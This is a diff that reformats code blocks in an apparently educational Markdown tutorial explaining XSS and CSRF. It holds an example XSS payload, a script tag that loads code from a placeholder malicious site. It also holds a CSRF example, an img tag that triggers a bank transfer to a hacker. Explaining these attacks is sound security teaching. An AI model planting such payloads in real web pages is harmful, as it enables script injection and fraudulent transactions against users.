@@ -31,7 +31,9 @@ the content.
 ```
 
 But, if someone input a string as below:
-`<script src="http://www.malicious-site.com/code"></script>`
+```html
+<script src="http://www.malicious-site.com/code"></script>
+```
 
 the final result may as:
 
@@ -113,8 +115,12 @@ But their difference is that XSS is to make use of the trust for users, CSRF is 
 
 For example, there is a request `http://www.money.com?account=sender&amount=10000&for=receiver` to transfer money while 
 the user was already logined and cookie was saved. If the user go to a malicious website which add a tag like 
-`<img src='http://www.money.com?account=sender&amount=10000&for=hacker'>`, the cookie will be with this request because of
-same domain.
+
+```html
+<img src='http://www.money.com?account=sender&amount=10000&for=hacker'>
+```
+
+the cookie will be with this request because of same domain.
 
 In this way, the hacker does not need to get the user's cookie when attacking.
 
